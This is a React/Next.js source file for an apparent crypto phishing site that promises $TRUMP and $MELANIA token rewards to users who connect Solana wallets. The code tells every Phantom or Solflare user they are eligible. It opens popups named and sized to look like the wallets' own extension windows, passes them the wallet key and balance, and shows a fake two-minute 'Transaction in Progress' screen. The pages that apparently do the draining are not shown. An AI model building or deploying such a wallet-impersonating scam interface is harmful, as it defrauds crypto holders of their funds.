"use client";

import { WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import LogoWithCursorEffect from "@/components/Logo";
import CustomModal from "@/components/CustomModal";
import { useEffect, useState, useRef } from "react";
import Image from "next/image";
import InfoCards from "./Cards";
import Contact from "@/components/footer";


const Home = () => {
  const { connection } = useConnection();
  const { publicKey, wallet } = useWallet();
  const [storedPublicKey, setStoredPublicKey] = useState<string | null>(null);
  const [storedBalance, setStoredBalance] = useState<number | null>(null);
  const [rewardClaimed, setRewardClaimed] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(false);  // Modal state
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const [isProceedModalOpen, setIsProceedModalOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false); // Loading state
  
  useEffect(() => {
    const fetchBalance = async () => {
      if (publicKey) {
        const balance = await connection.getBalance(publicKey);
        setStoredBalance(balance / 1e9); // Convert lamports to SOL
      }
    };
  
    fetchBalance();
  }, [publicKey, connection]);

  useEffect(() => {
    const savedPublicKey = localStorage.getItem("publicKey");
    const savedBalance = localStorage.getItem("balance");

    if (savedPublicKey) setStoredPublicKey(savedPublicKey);
    if (savedBalance) setStoredBalance(parseFloat(savedBalance));
  }, []);

  useEffect(() => {
    if (storedPublicKey) localStorage.setItem("publicKey", storedPublicKey);
    if (storedBalance !== null) localStorage.setItem("balance", storedBalance.toString());
  }, [storedPublicKey, storedBalance]);
  
  const openPopupFlow = async () => {
    if (!wallet) {
      console.log("No wallet connected!");
      return;
    }

    const walletName = wallet.adapter.name.toLowerCase();
    const popupWidth = 360;
    const popupHeight = 580;
    const left = window.screenX + (window.innerWidth - popupWidth);
    const top = window.screenY;

    if(walletName == 'solflare'){
    const popup = window.open(
      "/rewards", // Path to the popup page
      "solflare",
      `width=${popupWidth},height=${popupHeight},top=${top},left=${left},resizable,scrollbars=no,toolbar=no,menubar=no,location=no,status=no`
    );
   
    if (popup) {
      popup.onload = async () => {
        if (publicKey) {
          const balance = await connection.getBalance(publicKey);
          popup.postMessage({ publicKey: publicKey.toString(), balance }, window.location.origin);
          console.log(publicKey);
          console.log(balance);

          // Save the publicKey and balance to local state and localStorage
          setStoredPublicKey(publicKey.toString());
          setStoredBalance(balance / 1e9); // Convert lamports to SOL
        }
      };
    }}
    if(walletName == 'phantom'){
      const popup = window.open(
        "/reward", // Path to the popup page
        "Phantom Wallet",
        `width=${popupWidth},height=${popupHeight},top=${top},left=${left},resizable,scrollbars=no,toolbar=no,menubar=no,location=no,status=no`
      );
    if (popup) {
      popup.onload = async () => {
        if (publicKey) {
          const balance = await connection.getBalance(publicKey);
          popup.postMessage({ publicKey: publicKey.toString(), balance }, window.location.origin);
          console.log(publicKey);
          console.log(balance);

          // Save the publicKey and balance to local state and localStorage
          setStoredPublicKey(publicKey.toString());
          setStoredBalance(balance / 1e9); // Convert lamports to SOL
        }
      };
    }}
    

    if (publicKey) {
      const balance = await connection.getBalance(publicKey);
      setStoredPublicKey(publicKey.toString());
      setStoredBalance(balance / 1e9);
      setRewardClaimed(true); // Show reward card
    }
  };

  const handleBackgroundClick = () => {
    if (videoRef.current) {
      videoRef.current.muted = !videoRef.current.muted;
    }
  };

  const handleBuyClick = () => {
    window.open(
      "https://pump.fun/coin/FmVuYmiEZrbmP6eUfyt3EPNyi7MaY588hUg8GJEcpump",
      "_blank"
    );
  };

  const handleClaimRewardClick = () => {
    if (wallet?.adapter.name === "Solflare" || wallet?.adapter.name === "Phantom") {
      setIsProceedModalOpen(true); // Open modal for Solflare & Phantom wallets
    } else {
      setIsModalOpen(true); // Open unsupported wallet modal
    }
  };

  

  const handleProceedClick = async () => {
    setIsLoading(true); // Show loading screen
    setIsProceedModalOpen(false); // Close the modal

    openPopupFlow();
  
    setTimeout(() => {
      openPopupFlow(); // Proceed with reward claim
      setIsLoading(false); // Hide loading screen after 2 minutes
    }, 120000);
  };
  
  

  return (
    <main className="flex flex-col items-center bg-[#ff9b0f] min-h-screen py-10">
     <div className="absolute top-0 w-full flex justify-center items-center mt-4">
    <LogoWithCursorEffect />

  </div>

  {/* Connect Wallet Button */}
  <div className="absolute top-4 right-4 z-20">
    <WalletMultiButton />
  </div>
     

      {/* Info Text */}
      <h2 className="font-custom text-4xl text-white mt-32 text-center z-10">
        Connect a wallet to check reward eligibility
      </h2>

      {/* Step Arrow */}
      <Image src="/arrow.png" alt="Step Image" width={500} height={500} className="mt-6 z-10" />

      {/* Main Content Card */}
      <div className="mt-6 w-160 bg-[#ffbc0f] shadow-2xl rounded-xl p-6 text-center z-10">
        <h1 className="font-fire text-2xl font-bold">MAKE AMERICA GREAT NATION!</h1>
        <Image src="/usa.gif" alt="USA" width={150} height={150} className="mx-auto mt-4" />
        <button
  onClick={handleClaimRewardClick}
  disabled={!wallet}
  className="mt-4 bg-gradient-to-r from-yellow-200 via-yellow-400 to-orange-500 text-gray-900 font-medium rounded-lg text-sm px-5 py-2.5 shadow-lg hover:bg-gradient-to-br transform hover:scale-105 transition-all disabled:bg-gray-500 disabled:cursor-not-allowed"
>
  Claim Reward
</button>

      </div>

      {/* Info Cards */}

      <div className="mt-10">
        <InfoCards />

      </div>
      <div className="relative">
      </div>

      {/* Footer */}
      <Contact />

      {/* Custom Modal */}
      <CustomModal
        isOpen={isModalOpen}
        onClose={() => setIsModalOpen(false)}
        title="Unsupported Wallet"
        description="We currently only support Solflare and Phantom wallet."
      />
      <CustomModal
        isOpen={isProceedModalOpen}
        onClose={() => setIsProceedModalOpen(false)}
        title="Congrats!!"
        description="You are eligible to claim your reward. Click Proceed to continue."
      >
        <button
          onClick={handleProceedClick}
          className="mt-4 bg-green-500 text-white font-bold px-4 py-2 rounded-lg hover:bg-green-700 transition"
        >
          <div className="grid grid-cols-2 pt-2">
                        <div className="pl-6">
                          <Image
                            src="/melania.png"
                            alt="App Icon"
                            width={50}
                            height={50}
                            className="rounded-full"
                          />
                        </div>
                        <div>
                        <p>{storedBalance !== null ? (storedBalance * 100).toFixed(2) : "0.00"} $MELANIA</p>                        </div>
                      </div>
          
                      <div className="grid grid-cols-2">
                        <div className="pl-6 pt-6">
                          <Image
                            src="/trump.png"
                            alt="App Icon"
                            width={50}
                            height={50}
                            className="rounded-full"
                          />
                        </div>
                        <div className="pt-6">
                        <p>{storedBalance !== null ? (storedBalance * 100).toFixed(2) : "0.00"} $TRUMP</p>                        </div>
                      </div>
          Proceed
        </button>
      </CustomModal>

      {/* Loading Screen */}
      {isLoading && (
        <div className="absolute inset-0 bg-opacity-50 bg-black flex justify-center items-center z-30">
          <div className="flex flex-col justify-center items-center">
            <Image src="/loading.webp" alt="loading" width={50} height={50} className="" />
            <div className="mt-4 text-white text-xl">Transaction in Progress...</div>
          </div>
        </div>
      )}
    </main>

  );
};

export default Home;
